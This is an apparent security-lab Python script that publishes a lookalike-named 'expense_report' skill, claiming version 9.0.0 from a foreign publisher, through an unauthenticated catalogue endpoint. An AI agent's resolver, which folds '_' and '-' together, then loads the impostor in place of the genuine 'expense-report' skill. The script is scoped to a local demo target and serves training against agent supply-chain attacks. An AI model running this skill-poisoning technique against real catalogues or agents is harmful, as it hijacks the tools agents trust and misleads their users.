#!/usr/bin/env python3
"""Attack skill — publish a lookalike-named skill to the shared skill catalogue.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Publishes ``assets/lookalike_skill.json`` through the unauthenticated
``POST /catalogue/publish``. The entry is named ``expense_report`` (the real
skill is ``expense-report``), comes from a publisher that is not Goat & Co.
Finance, and claims version 9.0.0. It does not touch Billy Ops or any existing
skill. Billy discovers it on its next task: the resolver folds ``_`` and ``-``
together and loads the newest match. The entry is inert data; nothing in it
is executed.

Exit code: 0 when the skill was published, 1 when the target is unreachable
or rejects the entry.

Examples:
    python scripts/run_lookalike_publish.py
    python scripts/run_lookalike_publish.py --name Expense.Report --version 5.0.0
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("ASI04_TARGET", "http://127.0.0.1:5304")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "lookalike_skill.json")


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "asi04"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the ASI04 target. Start it: python vulnerable_app.py")
    return ok


def load_payload(path: str = DEFAULT_PAYLOAD) -> dict:
    with open(path, "r", encoding="utf-8") as fh:
        return json.load(fh)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="skill entry (JSON) to publish")
    parser.add_argument("--name", help="override the entry's name")
    parser.add_argument("--version", help="override the entry's version")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    entry = load_payload(args.payload)
    if args.name:
        entry["name"] = args.name
    if args.version:
        entry["version"] = args.version

    print(f"[*] Publishing skill '{entry['name']}' {entry['version']} as publisher "
          f"'{entry['publisher']}' (unauthenticated POST /catalogue/publish)")
    try:
        result = _post(f"{args.target}/catalogue/publish", {"skill": entry})
    except urllib.error.HTTPError as exc:
        print(f"[-] Catalogue rejected the entry: {exc.read().decode('utf-8', 'replace')}")
        return 1
    print(f"[+] Published {result['name']}@{result['publisher']} {result['version']}. "
          "1 skill added; no existing skill touched.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
